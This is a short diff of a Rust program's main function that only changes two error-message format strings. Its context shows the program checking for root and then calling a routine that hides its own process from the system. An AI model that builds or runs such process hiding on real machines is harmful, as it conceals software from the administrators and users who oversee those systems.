@@ -155,9 +155,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // Try to hide the process
     if let Err(e) = process_hider::check_root() {
-        eprintln!("Not running as root: {}. Skipping process hiding.", e);
+        eprintln!("Not running as root: {e}. Skipping process hiding.");
     } else if let Err(e) = process_hider::hide_process() {
-        eprintln!("Failed to hide process: {}", e);
+        eprintln!("Failed to hide process: {e}");
     }
 
     let args: Vec<String> = std::env::args().collect();
